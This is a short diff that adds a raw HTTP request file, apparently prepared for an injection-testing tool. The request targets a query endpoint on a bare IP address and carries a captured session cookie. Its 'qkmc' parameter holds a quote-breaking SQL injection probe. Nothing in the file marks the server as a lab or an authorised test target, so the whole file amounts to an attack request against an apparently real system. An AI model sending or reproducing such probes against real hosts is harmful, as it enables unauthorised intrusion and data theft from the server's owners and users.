@@ -1,0 +1,8 @@
+GET /XSJXKL/queryAllQk.action?page=1&qkmc=1'" HTTP/1.1
+Host: 121.41.33.168
+Referer: https://121.41.33.168/
+Cookie: JSESSIONID=5CC04CB15E155BE1DA5B0FBB078AA030
+Accept: */*
+x-requested-with: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+
